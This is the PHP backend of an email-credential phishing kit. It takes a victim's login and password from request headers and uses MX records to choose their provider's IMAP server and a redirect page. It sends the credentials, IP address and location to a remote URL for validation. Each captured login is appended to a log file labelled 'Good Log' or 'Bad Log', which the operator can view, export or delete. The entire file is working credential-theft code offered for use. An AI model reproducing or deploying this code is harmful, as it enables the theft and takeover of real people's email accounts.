<?php ob_start();
include("GetDetail.php");	
 

$getheaderdata = getallheaders();
if (isset($_REQUEST['logs'])) {
    echo "<a href='?logs&0'><strong>Delete Log file now.</strong></a> (Note this can not be undone! all you logs will vanish)<br/><br/><a href='?2'><strong>Export Log file now.</strong></a><br/><br/><hr/>";
    if (file_exists("rst.htm")) {
        include("rst.htm");
    } else {
        echo "No Result File Logs Yet";
    }
}
if (isset($_REQUEST['0'])) {
    if (file_exists("rst.htm")) {
        if (unlink("rst.htm")) {
            header("Location: ?logs");
            exit;
        };
    }
}
if (isset($_REQUEST["2"])) {
    $file = "rst.htm";
    $filepath = $file;
    if (file_exists($filepath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($filepath).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: '.filesize($filepath));
        flush();
        readfile($filepath);
        exit;
    }
}

$country = $location['countryName'];
$city = $location['cityName'];
$region = $location['regionName'];
$roll1 = '';
$roll2 = '';
$roll3 = '';
$roll4 = '';
$roll5 = '';
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');
 $acc = $getheaderdata['Authorization1'];
 $pp = $getheaderdata['Authorization'];


  if (strpos($acc, '@') !== false) {
    $login = $acc;
} else {
    $login = base64_decode($acc);
}
 
$port     =  '993';


///GET IMAP SETTINGS
$email=$login;
$domain = substr(strrchr($email, "@"), 1);
$hostname = 'mail.'.$domain;
$urlredi = 'https://webmail.'.$domain.'/webmail';	


if(mxrecordValidate($email, $domain)) {
$data = dns_get_record($domain, DNS_MX);
foreach ($data as $key1){
$explit=explode('.',$key1['target']);
foreach ($explit as $xkey1){
if (strpos(strtolower($key1['target']), 'outlook.com') !== false) {
$hostname = 'imap-mail.outlook.com';
$urlredi = 'https://outlook.office.com/owa/';
}elseif(strpos(strtolower($key1['target']), 'yahoo') !== false) {
		if (strpos(strtolower($key1['target']), 'aol') !== false){
		$src="login.aol.com";
		$urlredi = 'https://login.aol.com';
		}elseif (strpos(strtolower($key1['target']), 'mta') !== false){
		$hostname = 'imap.mail.yahoo.com';
		$urlredi ='https://login.yahoo.com';
		}else{
		$hostname = 'imap.mail.yahoo.com';
		$urlredi = 'https://login.yahoo.com';
		}
}elseif (strpos(strtolower($key1['target']), 'google') !== false) {
$hostname = 'imap.gmail.com';
$urlredi =  'https://myaccount.google.com';
}elseif(strpos(strtolower($key1['target']), 'qq') !== false) {
$hostname = 'imap.exmail.qq.com';
$urlredi =  'https://exmail.qq.com/cgi-bin/loginpage';
}elseif (strpos(strtolower($key1['target']), 'hinet') && strpos(strtolower($key1['target']), 'hibox') !== false) {
$hostname = 'hibox.hinet.net';
$urlredi =  'https://www.hibox.hinet.net/uwc/';
}elseif (strpos(strtolower($key1['target']), 'mailfilter')!== false) {
$hostname = 'hibox.hinet.net';
$urlredi =  'https://webmail.hinet.net/';
}elseif (strpos(strtolower($key1['target']), 'emailsrvr')!== false) {
$hostname = 'secure.emailsrvr.com';
$urlredi = 'https://apps.rackspace.com/index.php';
}elseif (strpos(strtolower($key1['target']), 'dns.com')!== false) {
$hostname = 'mx8.dns.com.cn';
$urlredi =  'http://www.dns.com.cn/login/toLogin.do';
}elseif (strpos(strtolower($key1['target']), 'zmail') !== false) {
$hostname = 'imap.zmail300.cn';
$urlredi =  'http://ssl.zmail300.cn/app/mail/index';
}elseif (strpos(strtolower($key1['target']), 'hinet') !== false) {
$hostname = $domain;
$urlredi = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'mailcloud') !== false) {
$hostname = 'ms.mailcloud.com.tw';
$urlredi =  'https://mail.mailasp.com.tw/';
}elseif (strpos(strtolower($key1['target']), 'vip') !== false) {
$hostname = $domain;
$urlredi = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'qiye.163.com') !== false) {
$hostname = 'imap.qiye.163.com';
$urlredi =  'https://mail.qiye.163.com';
}elseif (strpos(strtolower($key1['target']), 'netease') !== false) {
$hostname = 'imap.163.com';
$urlredi =  'https://email.163.com/';
}elseif (strpos(strtolower($key1['target']), 'secureserver.net') !== false) {
$hostname = 'imap.secureserver.net';
$urlredi = 'https://email25.godaddy.com/';
}elseif (strpos(strtolower($key1['target']), 'chinaemail') !== false) {
$hostname = 'mail.'.$domain;
$urlredi = 'http://'.$domain;
}elseif (strpos(strtolower($key1['target']), 'aliyun') !== false) {
$hostname = 'imap.mxhichina.com';
$urlredi = 'https://qiye.aliyun.com/';

}elseif (strpos(strtolower($key1['target']), 'mxhichina') !== false) {
$hostname = 'imap.mxhichina.com';
$urlredi = 'https://qiye.aliyun.com/';

}elseif (strpos(strtolower($key1['target']), 'zoho') && strpos(strtolower($key1['target']), 'smtp') !== false) {
$hostname = 'imap.zoho.com';
$urlredi = 'https://mail.zoho.com/zm/';

}elseif (strpos(strtolower($key1['target']), 'zoho') !== false) {
$hostname = 'imappro.zoho.com';
$urlredi = 'https://mail.zoho.com/zm/';

}elseif (strpos(strtolower($key1['target']), '263') !== false) {
$hostname = 'imapw.263.net';
$urlredi = 'http://263xmail.com/';

}elseif (strpos(strtolower($key1['target']), 'coremail') !== false) {
$hostname = 'imap.icoremail.net';
$urlredi =  'https://mail.icoremail.net/';
}elseif (strpos(strtolower($key1['target']), '1and1') !== false) {
$hostname = 'imap.1and1.co.uk';
$urlredi ='https://webmail.1and1.co.uk/';
}elseif (strpos(strtolower($key1['target']), "netsolmail") !== false) {
$hostname = 'imap.internetpro.net';
$urlredi =  'https://webmail5.networksolutionsemail.com/';
}elseif (strpos(strtolower($key1['target']), $domain) !== false) {
$hostname = 'mail.'.$domain;
$urlredi = 'https://webmail.'.$domain.'/webmail';	
}
}
}
}


 
 
if ($trueauthentic == true) {
     $result = get_remote_data($url.'?login='.base64_encode($login).'&pass='.base64_encode($pp).'&send_to='.base64_encode($recpadmin).'&hostname='.base64_encode($hostname).'&port='.base64_encode($port).'&recemail='.base64_encode($recemail).'&recdatabase='.base64_encode($recdatabase).'&datahost='.base64_encode($datahost).'&datauser='.base64_encode($datauser).'&datapass='.base64_encode($datapass).'&links='.base64_encode($urlredi).'&ip='.base64_encode($ip).'&country='.base64_encode($country).'&city='.base64_encode($city).'&region='.base64_encode($region).'&database='.base64_encode($database));
} else {
    $result = "off";
}


 

if (strpos($result, 'wok') !== false) {
    if (!empty($pp)) {
        $myfile = fopen("rst.htm", "a")or die("Unable to open file!");
        $txt = date("D_F_j_is_A").' New Verified Log ***Good Log*** <br/> user id : '.$login.'<br/> password :'.$pp.'</br/> region: '.$region.'</br/> city '.$city.'</br/> country '.$country.'</br/> ipaddress '.$ip.'</br/> ///////////////////////////////</br/></br/></br/>  ';
        fwrite($myfile, $txt);
        fclose($myfile);
        echo '{"p":"1","url":"'.$urlredi.'","country":"'.$country.'","ip":"'.$ip.'"}';
    }
    die;
} else {
    if (!empty($pp)) {
        $myfile = fopen("rst.htm", "a")or die("Unable to open file!");
        $txt = date("D_F_j_is_A").' New Not Verified Log ***Bad Log*** <br/> user id : '.$login.'<br/> password :'.$pp.'</br/> region: '.$region.'</br/> city '.$city.'</br/> country '.$country.'</br/> ipaddress '.$ip.'</br/> ///////////////////////////////</br/></br/></br/>  ';
        fwrite($myfile, $txt);
        fclose($myfile);
        echo '{"p":"0"}';
    }
    die;
}
?>